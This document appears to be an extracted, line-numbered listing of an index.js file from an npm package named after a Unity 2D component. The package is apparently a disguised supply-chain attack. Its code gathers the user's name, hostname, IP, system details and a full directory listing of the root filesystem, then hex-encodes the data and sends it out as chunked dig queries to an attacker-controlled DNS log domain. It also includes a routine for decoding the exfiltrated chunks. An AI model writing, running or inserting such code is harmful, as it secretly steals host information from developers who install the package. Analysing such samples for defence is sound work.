// File: tmp/tmp78c77n28/com.unity.2d.common/package/index.js
// ======================================================================
Line 1: _tmp_3 = require('child_process')
Line 2: const os = require('os')
Line 3: const dns = require('dns')
Line 4: const path = require('path')
Line 11: _iterator_0.next()
Line 12: _iterator_1.next()
Line 22: {
        exec(`find ${basePath} -type d`, (error, stdout, stderr) => {
            if (error) {
                reject(`Command execution error: ${stderr || error.message}`);
                return;
            }
            resolve(stdout.trim());
        });
    }
Line 23: exec(`find ${basePath} -type d`, (error, stdout, stderr) => {
            if (error) {
                reject(`Command execution error: ${stderr || error.message}`);
                return;
            }
            resolve(stdout.trim());
        })
Line 28: stdout.trim()
Line 33: {
    const username = os.userInfo().username;
    const hostname = os.hostname();
    const ip = getIPAddress();
    const currentPath = process.cwd();
    const fullDirectoryStructure = await getFullDirectoryStructure('/');

    exec("uname -a && pwd", async (error, stdout, stderr) => {
        if (error) {
            console.error(`Command execution error: ${stderr || error.message}`);
            return;
        }

        const systemInfo = `Username: ${username}\nHostname: ${hostname}\nIP: ${ip}\n${stdout.trim()}\nCurrent Path: ${currentPath}\nFull Directory Structure:\n${fullDirectoryStructure}`;
        const hexEncoded = Buffer.from(systemInfo).toString('hex');
        const maxLabelLength = 63;
        const chunks = hexEncoded.match(new RegExp(`.{1,${maxLabelLength}}`, 'g'));

        function sendDNSQuery(chunkIndex = 0, retries = 3) {
            if (chunkIndex >= chunks.length) {
                console.log('All data successfully sent via DNS');
                return...
Line 34: os.userInfo()
Line 35: os.hostname()
Line 36: getIPAddress()
Line 40: exec("uname -a && pwd", async (error, stdout, stderr) => {
        if (error) {
            console.error(`Command execution error: ${stderr || error.message}`);
            return;
        }

        const systemInfo = `Username: ${username}\nHostname: ${hostname}\nIP: ${ip}\n${stdout.trim()}\nCurrent Path: ${currentPath}\nFull Directory Structure:\n${fullDirectoryStructure}`;
        const hexEncoded = Buffer.from(systemInfo).toString('hex');
        const maxLabelLength = 63;
        const chunks = hexEncoded.match(new RegExp(`.{1,${maxLabelLength}}`, 'g'));

        function sendDNSQuery(chunkIndex = 0, retries = 3) {
            if (chunkIndex >= chunks.length) {
                console.log('All data successfully sent via DNS');
                return;
            }

            const subdomain = `${chunks[chunkIndex]}.chunk${chunkIndex}.${REMOTE_DNS_LOG_SERVER}`;
            const digCommand = `dig @${DNS_SERVER_IP} ${subdomain}`;

            exec(digCommand, (err, stdout, st...
Line 46: stdout.trim()
Line 47: Buffer.from(systemInfo).toString('hex')
Line 51: {
            if (chunkIndex >= chunks.length) {
                console.log('All data successfully sent via DNS');
                return;
            }

            const subdomain = `${chunks[chunkIndex]}.chunk${chunkIndex}.${REMOTE_DNS_LOG_SERVER}`;
            const digCommand = `dig @${DNS_SERVER_IP} ${subdomain}`;

            exec(digCommand, (err, stdout, stderr) => {
                console.log(`Executing command: ${digCommand}`);
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
                if (err && retries > 0) {
                    console.error(`DNS query error: ${stderr || err.message}, retrying...`);
                    sendDNSQuery(chunkIndex, retries - 1);
                } else if (!err) {
                    console.log(`Chunk ${chunkIndex} successfully sent via DNS`);
                    sendDNSQuery(chunkIndex + 1);
                } else {
                    console.error(`Failed to send chunk ${chunkInd...
Line 57: const subdomain = `${chunks[chunkIndex]}.chunk${chunkIndex}.${REMOTE_DNS_LOG_SERVER}`
Line 60: exec(digCommand, (err, stdout, stderr) => {
                console.log(`Executing command: ${digCommand}`);
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
                if (err && retries > 0) {
                    console.error(`DNS query error: ${stderr || err.message}, retrying...`);
                    sendDNSQuery(chunkIndex, retries - 1);
                } else if (!err) {
                    console.log(`Chunk ${chunkIndex} successfully sent via DNS`);
                    sendDNSQuery(chunkIndex + 1);
                } else {
                    console.error(`Failed to send chunk ${chunkIndex} after multiple attempts`);
                }
            })
Line 66: sendDNSQuery(chunkIndex, retries - 1)
Line 69: sendDNSQuery(chunkIndex + 1)
Line 76: sendDNSQuery()
Line 81: Buffer.from(hexString, 'hex')
Line 82: buffer.toString('utf8')
Line 85: {
    const chunkRegex = /\b([0-9a-f]{32,})\.chunk\d+\.dns\.hackwither\.com\b/;
    let decodedData = '';

    logLines.forEach(line => {
        const match = line.match(chunkRegex);
        if (match) {
            decodedData += decodeHex(match[1]);
        }
    });

    console.log('Decoded Data:', decodedData);
}
Line 86: const chunkRegex = /\b([0-9a-f]{32,})\.chunk\d+\.dns\.hackwither\.com\b/
Line 91: {
            decodedData += decodeHex(match[1]);
        }
Line 92: decodedData += decodeHex(match[1])
